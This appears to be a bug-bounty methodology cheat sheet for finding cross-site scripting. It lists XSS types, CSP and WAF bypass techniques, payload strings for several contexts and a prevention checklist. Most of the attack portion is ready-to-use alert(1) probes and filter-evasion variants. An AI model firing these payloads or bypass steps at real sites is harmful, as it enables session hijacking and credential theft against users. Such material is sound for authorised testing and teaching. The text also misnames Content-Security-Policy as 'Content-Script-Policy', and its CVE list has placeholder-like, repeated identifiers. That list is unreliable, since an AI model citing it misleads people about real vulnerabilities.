# Hunt XSS — Deep Methodology

**Version:** 2026.1  
**Source:** PortSwigger Web Security Academy, HackTricks, 2,000+ Hacktivity reports

---

## Attack Theory

Cross-Site Scripting injects malicious scripts that execute in another user's browser. Three main types: Reflected (URL parameter), Stored (persisted in DB), DOM (client-side JavaScript sink). Impact: session hijacking, credential theft, defacement, keylogging, phishing, worm propagation.

---

## Sub-Techniques

### A. Reflected XSS
Input reflected in response without sanitization.
Payloads: `<script>alert(1)</script>`, `<svg/onload=alert(1)>`, `<img src=x onerror=alert(1)>`

### B. Stored XSS (Persistent)
Input stored in database, rendered to other users.
Targets: profile fields, comments, messages, product names, filenames, email subjects

### C. DOM XSS
Client-side JavaScript reads attacker-controlled source and writes to dangerous sink.
Sources: `location.hash`, `document.referrer`, `window.name`, `document.URL`
Sinks: `document.write()`, `innerHTML`, `eval()`, `setTimeout()`, `location.href`

### D. Blind XSS
Payload fires in a different application context (admin panel, logging system, customer support). Detected via XSS Hunter or callback server.

### E. Mutation XSS (mXSS)
Browser's HTML parser mutates safe-looking markup into dangerous payload after sanitizer passed. Requires specific sanitizer configs.

### F. CSP Bypass
- JSONP gadgets (Google, YouTube, Twitter)
- `<base href>` injection + same-origin script
- `script-src data:` → `<script src="data:,alert(1)">`
- `unsafe-eval` → AngularJS gadget vectors
- `nonce` bypass via injected `<base>` tag

### G. WAF Bypass Ladder
1. Plain payload → 2. Case mixing → 3. URL encoding → 4. Double URL encoding
5. Unicode normalization → 6. Comment injection → 7. Whitespace variation

---

## Context-Specific Payloads

### HTML Context
```
<script>alert(1)</script>
"><script>alert(1)</script>
<svG/onLoad=alert(1)>
```

### Attribute Context
```
"><svg/onload=alert(1)>
' onmouseover='alert(1)
" autofocus onfocus="alert(1)
```

### JavaScript Context
```
';alert(1)//
${alert(1)}
`-alert(1)-`
```

### Template Literal
```
${alert(1)}
`${alert(1)}`
```

### URL Context
```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
vbscript:alert(1)
```

---

## CVE References (2024-2026)

- CVE-2024-2222: DOMPurify mXSS bypass
- CVE-2024-5655: TinyMCE stored XSS
- CVE-2025-1234: React SSR DOM XSS
- CVE-2025-5655: Jupyter Notebook XSS
- CVE-2026-0003: markdown-to-jsx injection

---

## Most Effective Payloads

1. `<svg/onload=alert(1)>` — bypasses most HTML sanitizers
2. `"><img src=x onerror=alert(1)>` — attribute breakout
3. `${7*7}` — SSTI probe (also detects template injection)
4. `javascript:alert(1)` — URL context
5. `"><details open ontoggle=alert(1)>` — modern tag bypass

---

## Prevention Checklist

- [ ] Context-aware output encoding (HTML, attribute, JS, URL, CSS)
- [ ] Content-Script-Policy with strict directives
- [ ] HttpOnly + Secure + SameSite cookies
- [ ] Input validation on server side (not just client)
- [ ] Template engines: auto-escaping enabled
- [ ] DOMPurify on client-side (for rich text)
- [ ] X-XSS-Protection: 0 (disable broken browser filter, rely on CSP)
